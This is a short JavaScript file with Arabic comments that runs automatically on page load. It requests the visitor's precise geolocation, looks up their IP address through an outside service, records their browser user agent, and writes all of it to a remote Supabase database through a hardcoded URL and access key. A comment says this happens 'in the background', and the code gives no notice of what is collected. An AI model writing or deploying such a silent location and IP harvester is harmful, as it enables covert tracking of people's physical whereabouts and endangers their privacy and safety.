const SUPA_URL = 'https://tboesfndjwxpxkkpdllf.supabase.co';
const SUPA_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRib2VzZm5kand4cHhra3BkbGxmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY0NTkxNDgsImV4cCI6MjA3MjAzNTE0OH0.HdYXGpBy1E3HXieQIIuSXfjdV5q-u9qCe4AG7POKS9E';
const supabase = window.supabase.createClient(SUPA_URL, SUPA_KEY);

async function getIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    const json = await res.json();
    return json.ip;
  } catch {
    return null;
  }
}

function getLocation(timeout = 25000) {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) return reject(new Error("المتصفح لا يدعم تحديد الموقع"));
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      err => reject(err),
      { enableHighAccuracy: true, timeout }
    );
  });
}

async function storeLocation() {
  try {
    const coords = await getLocation();
    const ip = await getIP();
    const device = navigator.userAgent;
    const { data, error } = await supabase.from('locations').insert([{
      device_name: device,
      ip: ip,
      lat: coords.latitude,
      lng: coords.longitude,
      accuracy: coords.accuracy ?? null
    }]);
    if (error) console.error('📛 فشل في الحفظ:', error.message);
    else console.log('✅ تم الحفظ في قاعدة البيانات');
  } catch (e) {
    console.warn('⚠️ لم يتم تحديد الموقع:', e.message);
  }
}

storeLocation(); // يتم تنفيذها في الخلفية
